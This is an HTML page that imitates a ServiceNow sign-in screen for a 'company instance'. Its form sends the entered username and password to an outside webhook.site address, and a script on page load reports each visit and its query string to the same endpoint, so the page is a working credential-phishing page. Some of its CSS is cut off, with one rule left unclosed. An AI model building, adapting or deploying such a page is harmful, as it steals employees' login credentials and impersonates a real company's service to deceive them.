<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In - ServiceNow</title>
<style>
body{font-family:-apple-system,'Helvetica Neue',Arial,sans-serif;background:#032d42;
margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:10px;box-shadow:0 4px 24px rgba(0,0,0,.35);
padding:40px 34px;width:88%;max-width:340px}
h1{font-size:21px;color:#032d42;margin:0 0 4px}

p{color:#5a6872;font-size:13px;margin:0 0 22px}

button{width:100%;margin-top:24px;padding:13px;border:0;border-radius:4px;

</style></head>
<body><div class="card">
<h1>Service<span class="now">Now</span></h1>
<p>Sign in to continue to your company instance</p>
<form method="POST" action="https://webhook.site/23a3300d-8c44-4498-8374-764bab6e7deb">
  <label>Username</label>
  <input name="username" autocomplete="username" required>
  <label>Password</label>
  <input name="password" type="password" autocomplete="current-password" required>
  <button type="submit">Sign In</button>
</form>
</div>
<script>
new Image().src = "https://webhook.site/23a3300d-8c44-4498-8374-764bab6e7deb/page-visit?path="
  + encodeURIComponent(location.pathname + location.search);
</script>
